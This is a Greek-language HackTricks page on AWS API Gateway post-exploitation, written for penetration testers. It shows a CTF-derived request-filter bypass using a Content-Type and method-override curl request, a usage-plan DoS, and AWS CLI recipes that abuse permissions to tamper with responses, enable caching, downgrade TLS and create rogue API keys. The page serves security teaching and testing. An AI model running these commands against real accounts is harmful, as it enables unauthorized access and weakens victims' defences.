# AWS - Μετεκμηκυνση μετά την εκμετάλλευση της API Gateway

{% hint style="success" %}
&#x20;Μάθετε & εξασκηθείτε στο Hacking του AWS:<img src="../../../.gitbook/assets/image.png" alt="" data-size="line">[**Εκπαίδευση HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image.png" alt="" data-size="line">\
&#x20;Μάθετε & εξασκηθείτε στο Hacking του GCP: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**Εκπαίδευση HackTricks GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε** 💬 [**στην ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τεχνικές χάκινγκ υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο github.

</details>
{% endhint %}

## API Gateway

Για περισσότερες πληροφορίες ελέγξτε:

{% content-ref url="../aws-services/aws-api-gateway-enum.md" %}
[aws-api-gateway-enum.md](../aws-services/aws-api-gateway-enum.md)
{% endcontent-ref %}

### Πρόσβαση σε μη εκτεθειμένες APIs

Μπορείτε να δημιουργήσετε ένα σημείο στο [https://us-east-1.console.aws.amazon.com/vpc/home#CreateVpcEndpoint](https://us-east-1.console.aws.amazon.com/vpc/home?region=us-east-1#CreateVpcEndpoint:) με την υπηρεσία `com.amazonaws.us-east-1.execute-api`, να εκθέσετε το σημείο σε ένα δίκτυο όπου έχετε πρόσβαση (πιθανώς μέσω μιας μηχανής EC2) και να αναθέσετε ένα ομάδα ασφαλείας που επιτρέπει όλες τις συνδέσεις.\
Στη συνέχεια, από τη μηχανή EC2 θα μπορείτε να έχετε πρόσβαση στο σημείο και συνεπώς να καλέσετε την πύλη API που δεν είχε εκτεθεί προηγουμένως.

### Παράκαμψη παράδοσης σώματος αιτήματος

Αυτή η τεχνική βρέθηκε στο [**αυτό το CTF writeup**](https://blog-tyage-net.translate.goog/post/2023/2023-09-03-midnightsun/?\_x\_tr\_sl=en&\_x\_tr\_tl=es&\_x\_tr\_hl=en&\_x\_tr\_pto=wapp).

Όπως προκύπτει από την [**τεκμηρίωση του AWS**](https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-properties-apigateway-method-integration.html) στην ενότητα `PassthroughBehavior`, από προεπιλογή, η τιμή **`WHEN_NO_MATCH`** , κατά τον έλεγχο της κεφαλίδας **Content-Type** του αιτήματος, θα προωθήσει το αίτημα στο back end χωρίς μετασχηματισμό.

Συνεπώς, στο CTF η API Gateway είχε ένα πρότυπο ενσωμάτωσης που **απέτρεπε την εκτροπή της σημαίας** σε μια απάντηση όταν αποστέλλονταν ένα αίτημα με `Content-Type: application/json`:

{% code overflow="wrap" %}
```yaml
RequestTemplates:
application/json: '{"TableName":"Movies","IndexName":"MovieName-Index","KeyConditionExpression":"moviename=:moviename","FilterExpression": "not contains(#description, :flagstring)","ExpressionAttributeNames": {"#description": "description"},"ExpressionAttributeValues":{":moviename":{"S":"$util.escapeJavaScript($input.params(''moviename''))"},":flagstring":{"S":"midnight"}}}'
```
{% endcode %}

Ωστόσο, η αποστολή ενός αιτήματος με **`Content-type: text/json`** θα αποτρέψει αυτό το φίλτρο.&#x20;

Τέλος, καθώς το API Gateway επέτρεπε μόνο τις `Get` και `Options`, ήταν δυνατόν να σταλεί μια αυθαίρετη ερώτηση dynamoDB χωρίς καμία περιορισμό στέλνοντας ένα αίτημα POST με την ερώτηση στο σώμα και χρησιμοποιώντας την κεφαλίδα `X-HTTP-Method-Override: GET`:

{% code overflow="wrap" %}
```bash
curl https://vu5bqggmfc.execute-api.eu-north-1.amazonaws.com/prod/movies/hackers -H 'X-HTTP-Method-Override: GET' -H 'Content-Type: text/json'  --data '{"TableName":"Movies","IndexName":"MovieName-Index","KeyConditionExpression":"moviename = :moviename","ExpressionAttributeValues":{":moviename":{"S":"hackers"}}}'
```
{% endcode %}

### Χρήση Σχεδίων DoS

Στην ενότητα **Απαρίθμησης** μπορείτε να δείτε πώς να **αποκτήσετε το σχέδιο χρήσης** των κλειδιών. Αν έχετε το κλειδί και είναι **περιορισμένο** σε X χρήσεις **ανά μήνα**, θα μπορούσατε απλά να το **χρησιμοποιήσετε και να προκαλέσετε ένα DoS**.

Το **Κλειδί API** χρειάζεται απλώς να **συμπεριληφθεί** μέσα σε ένα **HTTP κεφαλίδα** που ονομάζεται **`x-api-key`**.

### `apigateway:UpdateGatewayResponse`, `apigateway:CreateDeployment`

Ένας επιτιθέμενος με τις άδειες `apigateway:UpdateGatewayResponse` και `apigateway:CreateDeployment` μπορεί να **τροποποιήσει μια υπάρχουσα Απόκριση Πύλης για να περιλαμβάνει προσαρμοσμένες κεφαλίδες ή πρότυπα απόκρισης που διαρρέουν ευαίσθητες πληροφορίες ή εκτελούν κακόβουλα scripts**.

{% code overflow="wrap" %}
```bash
API_ID="your-api-id"
RESPONSE_TYPE="DEFAULT_4XX"

# Update the Gateway Response
aws apigateway update-gateway-response --rest-api-id $API_ID --response-type $RESPONSE_TYPE --patch-operations op=replace,path=/responseTemplates/application~1json,value="{\"message\":\"$context.error.message\", \"malicious_header\":\"malicious_value\"}"

# Create a deployment for the updated API Gateway REST API
aws apigateway create-deployment --rest-api-id $API_ID --stage-name Prod
```
{% endcode %}

**Πιθανή Επίπτωση**: Διαρροή ευαίσθητων πληροφοριών, εκτέλεση κακόβουλων scripts, ή μη εξουσιοδοτημένη πρόσβαση σε πόρους του API.

{% hint style="info" %}
Απαιτείται δοκιμή
{% endhint %}

### `apigateway:UpdateStage`, `apigateway:CreateDeployment`

Ένας επιτιθέμενος με τις άδειες `apigateway:UpdateStage` και `apigateway:CreateDeployment` μπορεί **να τροποποιήσει ένα υπάρχον στάδιο του API Gateway για να ανακατευθύνει την κίνηση σε διαφορετικό στάδιο ή να αλλάξει τις ρυθμίσεις caching για να κερδίσει μη εξουσιοδοτημένη πρόσβαση σε κρυφά δεδομένα**.

{% code overflow="wrap" %}
```bash
API_ID="your-api-id"
STAGE_NAME="Prod"

# Update the API Gateway stage
aws apigateway update-stage --rest-api-id $API_ID --stage-name $STAGE_NAME --patch-operations op=replace,path=/cacheClusterEnabled,value=true,op=replace,path=/cacheClusterSize,value="0.5"

# Create a deployment for the updated API Gateway REST API
aws apigateway create-deployment --rest-api-id $API_ID --stage-name Prod
```
{% endcode %}

**Πιθανή Επίπτωση**: Μη εξουσιοδοτημένη πρόσβαση σε κρυφά δεδομένα, διαταραχή ή παρεμπόδιση της κίνησης του API.

{% hint style="info" %}
Απαιτείται δοκιμή
{% endhint %}

### `apigateway:PutMethodResponse`, `apigateway:CreateDeployment`

Ένας επιτιθέμενος με τις άδειες `apigateway:PutMethodResponse` και `apigateway:CreateDeployment` μπορεί **να τροποποιήσει την απάντηση μεθόδου ενός υπάρχοντος μεθόδου API Gateway REST για να περιλαμβάνει προσαρμοσμένους κεφαλίδες ή πρότυπα απάντησης που διαρρέουν ευαίσθητες πληροφορίες ή εκτελούν κακόβουλα scripts**.
```bash
API_ID="your-api-id"
RESOURCE_ID="your-resource-id"
HTTP_METHOD="GET"
STATUS_CODE="200"

# Update the method response
aws apigateway put-method-response --rest-api-id $API_ID --resource-id $RESOURCE_ID --http-method $HTTP_METHOD --status-code $STATUS_CODE --response-parameters "method.response.header.malicious_header=true"

# Create a deployment for the updated API Gateway REST API
aws apigateway create-deployment --rest-api-id $API_ID --stage-name Prod
```
**Πιθανή Επίπτωση**: Διαρροή ευαίσθητων πληροφοριών, εκτέλεση κακόβουλων σεναρίων ή μη εξουσιοδοτημένη πρόσβαση σε πόρους του API.

{% hint style="info" %}
Απαιτείται δοκιμή
{% endhint %}

### `apigateway:UpdateRestApi`, `apigateway:CreateDeployment`

Ένας επιτιθέμενος με τις άδειες `apigateway:UpdateRestApi` και `apigateway:CreateDeployment` μπορεί **να τροποποιήσει τις ρυθμίσεις του API Gateway REST API για να απενεργοποιήσει την καταγραφή καταγραφής ή να αλλάξει την ελάχιστη έκδοση TLS, με δυνητική απόδυναμωση της ασφάλειας του API**.
```bash
API_ID="your-api-id"

# Update the REST API settings
aws apigateway update-rest-api --rest-api-id $API_ID --patch-operations op=replace,path=/minimumTlsVersion,value='TLS_1.0',op=replace,path=/apiKeySource,value='AUTHORIZER'

# Create a deployment for the updated API Gateway REST API
aws apigateway create-deployment --rest-api-id $API_ID --stage-name Prod
```
**Πιθανή Επίπτωση**: Αποδυνάμωση της ασφάλειας του API, πιθανώς επιτρέποντας μη εξουσιοδοτημένη πρόσβαση ή αποκάλυψη ευαίσθητων πληροφοριών.

{% hint style="info" %}
Απαιτείται δοκιμή
{% endhint %}

### `apigateway:CreateApiKey`, `apigateway:UpdateApiKey`, `apigateway:CreateUsagePlan`, `apigateway:CreateUsagePlanKey`

Ένας επιτιθέμενος με δικαιώματα `apigateway:CreateApiKey`, `apigateway:UpdateApiKey`, `apigateway:CreateUsagePlan` και `apigateway:CreateUsagePlanKey` μπορεί **να δημιουργήσει νέα κλειδιά API, να τα συσχετίσει με σχέδια χρήσης και στη συνέχεια να χρησιμοποιήσει αυτά τα κλειδιά για μη εξουσιοδοτημένη πρόσβαση σε APIs**.
```bash
# Create a new API key
API_KEY=$(aws apigateway create-api-key --enabled --output text --query 'id')

# Create a new usage plan
USAGE_PLAN=$(aws apigateway create-usage-plan --name "MaliciousUsagePlan" --output text --query 'id')

# Associate the API key with the usage plan
aws apigateway create-usage-plan-key --usage-plan-id $USAGE_PLAN --key-id $API_KEY --key-type API_KEY
```
**Πιθανή Επίπτωση**: Μη εξουσιοδοτημένη πρόσβαση σε πόρους του API, παράκαμψη ελέγχων ασφαλείας.

{% hint style="info" %}
Απαιτείται δοκιμή
{% endhint %}

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**Την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο GitHub.

</details>
